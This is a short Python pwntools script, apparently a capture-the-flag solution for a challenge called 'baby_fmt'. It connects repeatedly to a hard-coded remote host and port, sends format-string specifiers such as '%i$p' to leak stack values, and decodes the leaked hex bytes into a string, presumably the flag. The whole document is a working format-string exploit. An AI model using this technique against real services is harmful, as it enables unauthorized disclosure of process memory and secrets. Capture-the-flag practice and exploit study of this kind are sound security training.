#!/usr/bin/python3

from pwn import *
import sys

# change those
BINARY = './baby_fmt'
LIBC = ''
HOST = '140.110.112.77'
PORT = 4001

context.binary = BINARY
e = ELF( BINARY )
libc = ''

if len(sys.argv) > 1:
    r = remote( HOST, PORT )
    if LIBC != '':
        libc = ELF( LIBC )
else: 
    r = process( BINARY )
    if LIBC != '':
        libc = ELF( '/lib/x86_64-linux-gnu/libc.so.6' )

o = b''
for i in range(1,13):
    r = remote( HOST, PORT )
    r.send(f'%{i}$p')
    r.recvuntil('You said:')
    res = r.recv()

    if res != b'(nil)' and (len(res) % 2 == 0):
        o += bytes.fromhex(res[2:].decode())[::-1]
    r.close()
print(o)
